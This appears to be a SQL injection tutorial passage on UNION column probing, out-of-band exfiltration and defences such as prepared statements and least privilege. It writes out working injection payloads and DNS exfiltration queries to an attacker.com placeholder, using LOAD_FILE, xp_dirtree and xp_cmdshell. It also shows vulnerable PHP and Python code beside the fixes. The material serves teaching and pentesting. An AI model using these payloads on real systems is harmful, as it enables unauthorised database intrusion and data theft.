
### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.


#### Out-of-Band SQL Injection

Out-of-Band (OOB) SQL Injection works differently from everything covered so far. Instead of reading results through the web response, you force the database server to reach out to a server you control through a separate channel, usually DNS or HTTP, and carry the stolen data with it.

## When You Need Out-Of-Band

OOB comes into play when everything else has failed:

- In-Band is off the table because the app does not show query results or errors.
- Boolean-Based does not work because the response looks the same regardless of the condition.
- Time-Based is unreliable because the network is too noisy, or `SLEEP()` is blocked.
- But the database server **can** make outbound connections. That last point is the requirement. If the firewall blocks all outbound traffic from the DB server, OOB is dead in the water.

You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.

## How It Works

Two channels are involved:

1. The **attack channel**: your normal web request with the injection payload.
2. The **data channel**: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

## DNS Exfiltration With MySQL

The most common OOB trick for MySQL uses `LOAD_FILE()` to trigger a DNS lookup. You embed the data you want as a subdomain:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

What happens:

1. `(SELECT database())` pulls the database name. Let's say it is `webapp_db`.
2. `CONCAT()` builds the string `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` tries to read that file path. On Windows, this initiates a DNS lookup for `webapp_db.attacker.com`.
4. Your DNS server catches the request and logs `webapp_db`. The data is in the subdomain.

This works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

## MSSQL Techniques

Microsoft SQL Server has stored procedures that make OOB more direct:

`xp_dirtree` triggers a DNS lookup by trying to list a directory on a remote server:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (if it is enabled) runs OS commands directly, so you can use `nslookup` or `curl` to ship data out:

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

`xp_cmdshell` is off by default in modern MSSQL, but `xp_dirtree` is still available and gets used regularly in pentests.

Knowing how to exploit SQLi matters, but so does knowing how to fix it. When you write up a SQLi finding for a client, you need to explain the fix, not just the bug. Here are the main defences, roughly in order of how much they help.

## Prepared Statements (Parameterised Queries)

Prepared statements are the fix. The real one. They separate SQL code from data. The developer writes the query structure with placeholders for user input, and the database receives the input separately, treating it as data only. Never as executable SQL.

**Vulnerable PHP code:**

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

User input gets concatenated into the query string. An attacker can escape quotes and inject whatever they want.

**Fixed with prepared statements (PDO):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

The `?` is a placeholder. Whatever the user enters, even `' OR 1=1--`, the database treats the whole thing as a literal string. It never touches the query structure.

**Vulnerable Python code:**

```python
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

**Fixed:**

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

`%s` is a parameter placeholder. The MySQL connector handles escaping and binding for you.

Every language and framework supports this pattern. Define the query with placeholders, and pass user input as parameters. SQL Injection is gone because the input physically cannot change the query structure.

## Input Validation

Input validation controls what the application accepts before anything reaches the database. The best approach is **allowlisting**: define exactly what is valid and reject everything else.

If a parameter should be a numeric article ID, check it:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

Never rely on validation alone. Use it alongside prepared statements. Blocklisting (trying to filter out characters like `'` or `--`) is brittle. Attackers will find ways around your filter. Double encoding, alternate syntax, something you did not think of.

## Escaping User Input

Escaping means putting a backslash before special characters so the database treats them as literals instead of syntax. ' becomes `\'`.

It can stop basic injection, but it is fragile and database-specific. Every engine has different special characters and escaping rules. Use it as a last resort, such as when dealing with legacy code that cannot be refactored to use prepared statements.

## Principle of Least Privilege

Even with good input handling, defence-in-depth means limiting the blast radius. The database account the web app uses should have the bare minimum permissions:

- Read-only application? The account gets `SELECT` privileges and nothing else.
- Never connect as `root` or `sa` from the application.
- Lock down access to sensitive tables so only the procedures that need them can reach them.

If someone does exploit SQL injection through a low-privilege account, they cannot `DROP` tables, access other databases, or run system commands.

## Web Application Firewalls (WAFs)

A WAF inspects incoming requests and blocks known attack patterns: `' OR 1=1`, `UNION SELECT`, `information_schema`, that kind of thing.

But WAFs are not a substitute for writing secure code. Experienced attackers bypass them with encoding tricks, alternative syntax, and obfuscation. Treat a WAF as an extra layer, not the defence.